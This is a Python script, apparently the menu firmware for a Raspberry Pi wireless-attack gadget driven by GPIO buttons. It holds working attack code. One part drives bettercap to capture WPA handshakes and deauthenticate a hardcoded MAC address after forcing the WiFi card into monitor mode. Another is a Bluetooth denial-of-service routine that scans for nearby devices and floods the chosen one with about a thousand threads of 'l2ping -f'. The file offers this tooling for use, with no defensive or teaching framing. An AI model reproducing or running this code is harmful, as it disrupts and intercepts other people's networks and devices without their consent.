import RPi.GPIO as GPIO
import time
import os
import subprocess
import socket
import sys
import threading
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from lib import dos_bluetooth
from lib.dos_bluetooth import dos
import functools
from lib.mojstd import *

scroll_offset = 0
max_visible_options = 7
#Bettercap
commands = [
    'wifi.recon on',
    'wifi.show',
    'set net.sniff.verbose true',
    'set net.sniff.filter ether proto 0x888e',
    'set net.sniff.output wpa.pcap',
    'net.sniff on',
    'wifi.deauth bc:15:ac:76:5d:69'
]

#@functools.lru_cache(maxsize=236)
def draw_menu(selected_index):
    global scroll_offset
    draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))

    # Determina quante opzioni sono fuori dallo schermo e gestisce lo scorrimento
    total_options = len(menu_options)

    # Controlla se bisogna scorrere in basso o in alto
    if selected_index < scroll_offset:
        scroll_offset = selected_index
    elif selected_index >= scroll_offset + max_visible_options:
        scroll_offset = selected_index - max_visible_options + 1

    # Calcola l'offset per le opzioni del menu

    for i in range(scroll_offset, min(scroll_offset + max_visible_options, total_options)):
        y = ((i - scroll_offset) * 20) # Spacing between menu items with offset
        option = menu_options[i]
        if i == selected_index:
            text_size = draw.textbbox((0, 0), option, font=font)
            text_width = text_size[2] - text_size[0]
            text_height = text_size[3] - text_size[1]
            draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0)) #Highlight background
            draw.text((1, y), option, font=font, fill=(0, 0, 0))  # Text in black
        else:
            draw.text((1, y), option, font=font, fill=(255, 255, 255))  # Text in white

    # Display the updated image
    disp.LCD_ShowImage(image, 0, 0)

menu_options = ["Networks","Bluetooth", "Payload", "Party", "App & Plugin", "Shutdown"]
selected_index = 0




#############################################################################################

                                        # THE WHILE#

#############################################################################################




while True:
    draw_menu(selected_index)

    if GPIO.input(KEY_UP_PIN) == 0:
        selected_index = (selected_index - 1) % len(menu_options)
        draw_menu(selected_index)
        time.sleep(0.3)

    elif GPIO.input(KEY_DOWN_PIN) == 0:
        selected_index = (selected_index + 1) % len(menu_options)
        draw_menu(selected_index)
        time.sleep(0.3)

    elif GPIO.input(KEY_PRESS_PIN) == 0:

        selected_option = menu_options[selected_index]

        if selected_option == "Networks":
            # Draw and handle the Network sub-menu
            menu_options = ["Wifi", "Deauth", "Firewall"]
            selected_index = 0

            # NETWORKS
            time.sleep(0.25)
            while True:
                draw_menu(selected_index)


                if GPIO.input(KEY_UP_PIN) == 0:
                    selected_index = (selected_index - 1) % len(menu_options)
                    draw_menu(selected_index)
                    time.sleep(0.3)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)
                    time.sleep(0.3)

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    if selected_option == "Wifi":
                        menu_options = ["Pwnagotchi", "Wifiphisher", "Handshakes"]
                        selected_index = 0

                        #WIFI

                        time.sleep(0.30)
                        while True:
                            draw_menu(selected_index)


                            if GPIO.input(KEY_UP_PIN) == 0:
                                selected_index = (selected_index - 1) % len(menu_options)
                                draw_menu(selected_index)
                                time.sleep(0.3)

                            elif GPIO.input(KEY_DOWN_PIN) == 0:
                                selected_index = (selected_index + 1) % len(menu_options)
                                draw_menu(selected_index)
                                time.sleep(0.3)

                            elif GPIO.input(KEY_PRESS_PIN) == 0:
                                selected_option = menu_options[selected_index]

                                if selected_option == "Handshakes":
                                    #menu_options = ["Pwnagotchi", "Wifiphisher"]
                                    #selected_index = 0
                                    show_message("TEST")
                                    os.system("sudo airmon-ng check kill")
                                    os.system("sudo ifconfig wlan0 down && sudo iwconfig wlan0 mode monitor")

                                    time.sleep(2)
                                    bettercap_process = subprocess.Popen(
                                        ['sudo', 'bettercap', '-iface', 'wlan0'],
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        text=True,
                                        bufsize=1 #sono piccole memorie in cui vengono storati le cose temporaneamente, i byte vengono letti a blocchi è  più veloce
                                    )

                                    time.sleep(0.5)
                                    for i in commands:
                                        bettercap_process.stdin.write(i+'\n')
                                        bettercap_process.stdin.flush()
                                        show_message(bettercap_process.stdout.readline(),2)
                                        #
                                        with open("output.txt", 'a') as file:
                                            file.write(bettercap_process.stdout.readline())

                                        #show_message(i, 1)

                                    try:
                                        while True:
                                            output = bettercap_process.stdout.readline()
                                            #if output == '' and bettercap_process.poll() is not None:
                                             #   break
                                            if output:
                                                print(output.strip())
                                    except KeyboardInterrupt:
                                        # Terminate the Bettercap process if needed
                                        bettercap_process.terminate()
                                        bettercap_process.wait()  # Wait for the process to terminate






        elif selected_option == "Bluetooth":
            # Draw and handle the Network sub-menu
            menu_options = ["Dos", "Multiple attacks"]
            selected_index = 0
            time.sleep(0.20)
            #

            while True:

                draw_menu(selected_index)


                if GPIO.input(KEY_UP_PIN) == 0:
                        selected_index = (selected_index - 1) % len(menu_options)
                        draw_menu(selected_index)
                        time.sleep(0.3)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)
                    time.sleep(0.3)

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    #Bluetooth Dos

                    if selected_option == "Dos":

                        show_message("Wait please . . .")
                        menu_options = []
                        selected_index = 0

                        dos().main()       #Scan for mac address
                        for i in dos_bluetooth.mac_addrs:
                            menu_options.append(i)

                        time.sleep(0.25)
                        while True:
                            draw_menu(selected_index)


                            if GPIO.input(KEY_UP_PIN) == 0:
                                selected_index = (selected_index - 1) % len(menu_options)
                                draw_menu(selected_index)

                            elif GPIO.input(KEY_DOWN_PIN) == 0:
                                selected_index = (selected_index + 1) % len(menu_options)
                                draw_menu(selected_index)

                            elif GPIO.input(KEY_PRESS_PIN) == 0:
                                selected_option = menu_options[selected_index]

                                #while True:
                                mac = str(selected_option)
                                print(mac)
                                def DOS(a):
                                        #os.system("sudo " + "hciconfig " + "hci0 " + "up")
                                        #os.system('sudo l2ping -i hci0 -s 600 -f '+ mac)
                                        subprocess.run(['sudo', 'l2ping', '-i', 'hci0', '-s', '600', '-f', a], capture_output=True, text=True)
                                        #print(a)
                                        #if result.stdout == "Can't connect: Host is down":
                                          #   show_message("Error: HOST IS DOWN", 1)
                                            #break



                                for i in range(0, 1025, 1):
                                    show_message(f"""Dossing
    {mac} . . .""")
                                    threading.Thread(target=DOS, args=[str(mac)]).start()

                                    if GPIO.input(KEY3_PIN) == 0:
                                        show_message("Exiting", 1)
                                        break
                                break


                    elif selected_option == "Multiple attacks":
                        pass
